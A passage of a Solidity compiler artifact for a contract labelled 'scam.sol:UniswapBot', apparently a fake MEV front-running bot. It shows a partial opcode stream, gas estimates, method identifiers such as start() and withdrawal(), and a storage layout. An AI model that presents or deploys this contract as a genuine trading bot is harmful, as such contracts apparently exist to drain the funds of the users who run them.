0x6E6E696E67204D455620616374696F6E2E2054686973 KECCAK256 PUSH4 0x616E2074 PUSH2 0x6B65 KECCAK256 PUSH2 0x2077 PUSH9 0x696C653B20706C6561 PUSH20 0x6520776169742E2EA2646970667358221220664F 0x2C MOD SWAP16 SLOAD SLOAD 0x2F MOD CALL SIGNEXTEND DUP9 SHL CALLDATACOPY 0xE7 LOG4 0xB4 SLOAD 0xDD SELFDESTRUCT 0xD1 SELFDESTRUCT 0xC0 DUP11 PUSH20 0x98478D351FDE5F64736F6C634300060C00330000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "590200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"debugBot()": "infinite",
						"debugMempool()": "infinite",
						"start()": "infinite",
						"withdrawal()": "infinite"
					},
					"internal": {
						"_callMEVAction()": "infinite",
						"beyond(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
						"calcLiquidityInContract(struct UniswapBot.slice memory)": "infinite",
						"callMempool()": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"findContracts(uint256,uint256,uint256,uint256)": "infinite",
						"findNewContracts(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
						"findPtr(uint256,uint256,uint256,uint256)": "infinite",
						"getMemPoolDepth()": "23",
						"getMemPoolHeight()": "23",
						"getMemPoolLength()": "infinite",
						"getMemPoolOffset()": "23",
						"keccak(struct UniswapBot.slice memory)": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"memcpy(uint256,uint256,uint256)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"nextContract(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
						"orderContractsByLiquidity(struct UniswapBot.slice memory)": "infinite",
						"parseMempool(string memory)": "infinite",
						"toHexDigit(uint8)": "213",
						"uint2str(uint256)": "infinite",
						"withdrawalProfits()": "infinite"
					}
				},
				"methodIdentifiers": {
					"debugBot()": "7d53d433",
					"debugMempool()": "e1812f05",
					"start()": "be9a6555",
					"withdrawal()": "d4e93292"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 583,
						"contract": "scam.sol:UniswapBot",
						"label": "debugMempool",
						"offset": 0,
						"slot": "0",
						"type": "t_string_storage"
					},
					{
						"astId": 585,
						"contract": "scam.sol:UniswapBot",
						"label": "debugBot",
						"offset": 0,
						"slot": "1",
						"type": "t_string_storage"
					},
					{
						"astId": 587,
						"contract": "scam.sol:UniswapBot",
						"label": "liquidity",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}